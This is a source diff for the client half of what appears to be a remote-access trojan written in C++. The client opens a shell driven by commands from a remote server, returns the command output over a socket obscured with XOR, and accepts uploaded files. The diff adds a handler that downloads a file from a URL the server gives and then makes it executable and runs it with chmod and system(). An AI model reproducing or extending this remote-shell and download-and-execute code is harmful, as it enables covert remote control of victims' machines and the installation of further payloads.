@@ -16,7 +16,7 @@ void Client::threadReadShell(int& Pipe){
 		}
 		cCmdOutput[iRet] = '\0';
 		strCmd = cCmdOutput;
-		strCmdOutput = txtCipher.ShellXor(strCmd, strPassword);
+		strCmdOutput = ShellXor(strCmd, strPassword);
 		iLen = strCmdOutput.length();
 		iRet = send(sckSocket, strCmdOutput.c_str(), iLen, 0);
 		#ifdef _DEBUG
@@ -110,11 +110,10 @@ void Client::SpawnShell(const std::string strCommand){
 				break;
 			}
 			cCmdBuffer[iBytes] = '\0';
-			strCmdBuffer = txtCipher.ShellXor(std::string(cCmdBuffer), std::string("password"));
+			strCmdBuffer = ShellXor(std::string(cCmdBuffer), std::string("password"));
 			#ifdef _DEBUG
 			std::cout<<"Command "<<strCmdBuffer<<'\n';
 			#endif
-			//write to InPipeFD[1] 
 			write(InPipeFD[1], strCmdBuffer.c_str(), strCmdBuffer.length());
 			if(strcmp(strCmdBuffer.c_str(), "exit\n") == 0){
 				#ifdef _DEBUG
@@ -125,13 +124,12 @@ void Client::SpawnShell(const std::string strCommand){
 			}
 		}
 		t1.join();
-		
-		if(send(sckSocket, CommandCodes::cShellEnd, 3, 0) <= 0){
+		if(ssSendBinary(CommandCodes::cShellEnd) <= 0){
 			#ifdef _DEBUG
 			std::cout<<"Unable to send command to server\n";
 			error();
 			#endif
-		}
+		}	
 	} else {
 		#ifdef _DEBUG
 		std::cout<<"fork failed\n";
@@ -280,11 +278,11 @@ bool Client::ParseCommand(char*& strCommand){
 	#ifdef _DEBUG
 	std::cout<<"Parsing command "<<strCommand<<'\n';
 	#endif
+	std::string strLocalFileName = "", strCmdLine = "";
 	std::vector<std::string> vcCommands;
 	Misc::strSplit(strCommand, '@', vcCommands, 10);
 	if(vcCommands.size() > 0){
 		if(vcCommands[0] == CommandCodes::cUpload){ //receive file from server
-			//commandcode@filesize@run(1|0)@localfile
 			RetrieveFile(Misc::StrToUint(vcCommands[1].c_str()), vcCommands[2][0], vcCommands[3]);
 			goto release;
 		}
@@ -308,6 +306,29 @@ bool Client::ParseCommand(char*& strCommand){
 		}
 		if(vcCommands[0] == CommandCodes::cShell){
 			SpawnShell(vcCommands[1]);
+			goto release;
+		}
+		if(vcCommands[0] == CommandCodes::cHttpd){
+			if(Download(vcCommands[1].c_str(), strLocalFileName)){
+				#ifdef _DEBUG
+				std::cout<<"\nDownload success\n";
+				#endif
+				if(vcCommands[2] == "1"){
+					#ifdef _DEBUG
+					std::cout<<"Executing file "<<strLocalFileName<<'\n';
+					#endif
+					strCmdLine = "chmod +x ";
+					strCmdLine.append(strLocalFileName);
+					strCmdLine.append(" && ");
+					strCmdLine.append(strLocalFileName);
+					strCmdLine.append(" &");
+					system(strCmdLine.c_str());
+				}
+			} else {
+				#ifdef _DEBUG
+				std::cout<<"\nUnable to download file\n";
+				#endif
+			}
 			goto release;
 		}
 		
@@ -367,7 +388,7 @@ void Client::CloseConnection(){
 }
 
 int Client::ssSendStr(const std::string& strMessage){
-	std::string strTmp = txtCipher.strCipher(strMessage);
+	std::string strTmp = strCipher(strMessage);
 	int sBytes = strTmp.length();
 	int iBytes = send(sckSocket, strTmp.c_str(), sBytes, 0);
 	return iBytes;
@@ -379,7 +400,7 @@ int Client::ssRecvStr(std::string& strOutput, int sBytes){
 	if(iBytes <= 0){
 		return -1;
 	}
-	strOutput = txtCipher.strUnCipher(std::string(tmpData));
+	strOutput = strUnCipher(std::string(tmpData));
 	delete[] tmpData;
 	tmpData = nullptr;
 	return iBytes;
@@ -387,7 +408,7 @@ int Client::ssRecvStr(std::string& strOutput, int sBytes){
 
 int Client::ssSendBinary(const char *cData){
 	char *tmpData = nullptr;
-	int sBytes = txtCipher.BinaryCipher(cData, tmpData);
+	int sBytes = BinaryCipher(cData, tmpData);
 	int iBytes = send(sckSocket, tmpData, sBytes, 0);
 	#ifdef _DEBUG_CONNECTION
 	std::cout<<"> "<<cData<<'\n';
@@ -409,7 +430,7 @@ int Client::ssRecvBinary(char*& cOutput, int sBytes){
 		cBuffer = nullptr;
 		return -1;
 	}
-	cOutput = txtCipher.BinaryUnCipher((const char *)cBuffer);
+	cOutput = BinaryUnCipher((const char *)cBuffer);
 	#ifdef _DEBUG_CONNECTION
 	std::cout<<"< "<<cOutput<<'\n';
 	//std::cout<<"Ciphered<<"<<cBuffer<<'\n';
